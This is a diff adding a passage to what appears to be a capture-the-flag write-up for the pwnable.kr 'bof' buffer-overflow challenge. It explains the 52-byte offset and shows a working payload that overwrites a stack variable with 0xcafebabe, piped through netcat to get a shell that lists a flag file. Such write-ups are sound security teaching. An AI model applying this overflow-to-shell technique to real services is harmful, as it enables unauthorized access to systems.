@@ -87,4 +87,18 @@ cmp    DWORD PTR [ebp+0x8],0xcafebabe
 
 lea    eax,[ebp-0x2c]
 ```
+With these instructions, you can think of putting 52 of characters and then putting \xbe\xba\xfe\xca will overwrite key with 0xcafebabe
 
+```
+lovehacker@kali:~/ctf/pwnable.kr/p_bof$ (python -c 'print "A"*52+ "\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
+ls
+bof
+bof.c
+flag
+log
+log2
+super.pl
+
+```
+
+Easy pwned.
